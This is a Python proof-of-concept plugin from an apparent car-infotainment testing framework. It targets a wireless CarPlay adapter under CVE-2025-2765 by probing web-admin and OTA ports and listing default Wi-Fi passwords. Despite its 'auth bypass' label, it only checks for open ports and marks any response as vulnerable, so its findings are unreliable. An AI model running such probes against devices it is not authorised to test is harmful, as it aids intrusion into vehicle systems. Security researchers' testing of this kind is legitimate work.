"""
PoC Name: Wireless Dongle Auth Bypass
CVE: CVE-2025-2765
Component: Application Stack
Category: Application
Severity: Critical
CVSS: 8.8
Description: 无线CarPlay/AA适配器硬编码WiFi凭据和认证绕过
Prerequisites: 目标无线适配器可达。
Usage: python3 58_CarlinKit_Auth_Bypass.py <target_ip>
"""
import socket
import sys
from iv_plugin_base import IVIVulnerabilityPlugin
class CarlinKitBypassPlugin(IVIVulnerabilityPlugin):
    WEAK_PASSWORDS = ["12345678", "88888888", "00000000", "autokit123"]
    def check_prerequisites(self):
        if not self.target_ip:
            raise RuntimeError("需要指定目标IP地址")
        return True
    def exploit(self):
        self.logger.info(f"无线适配器认证绕过测试 {self.target_ip}")
        self.logger.info("CVE-2025-2765: 硬编码Wi-Fi凭据 + 认证绕过")
        # Check for web admin panel
        for port in [80, 8080, 443]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                if s.connect_ex((self.target_ip, port)) == 0:
                    req = f"GET / HTTP/1.0\r\nHost: {self.target_ip}\r\n\r\n"
                    s.send(req.encode())
                    resp = s.recv(2048).decode("utf-8", "ignore")
                    if "200 OK" in resp or "autokit" in resp.lower() or "carplay" in resp.lower():
                        self.logger.warning(f"[+] Web管理面板发现于端口 {port}")
                        self.results["vulnerable"] = True
                        self.results["evidence"] = f"Web admin panel on port {port}"
                        s.close()
                        return self.results
                s.close()
            except:
                pass
        # Check OTA update port (common: 19000, 18000)
        for port in [19000, 18000, 12345]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                if s.connect_ex((self.target_ip, port)) == 0:
                    self.logger.warning(f"[+] OTA/控制端口 {port} 开放")
                    self.results["vulnerable"] = True
                    self.results["evidence"] = f"OTA port {port} open"
                    s.close()
                    return self.results
                s.close()
            except:
                pass
        self.logger.info("[-] 未发现可利用的管理接口")
        self.results["vulnerable"] = False
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 58_CarlinKit_Auth_Bypass.py <target_ip>")
        sys.exit(1)
    plugin = CarlinKitBypassPlugin({"target_ip": sys.argv[1]})
    plugin.run_verify()
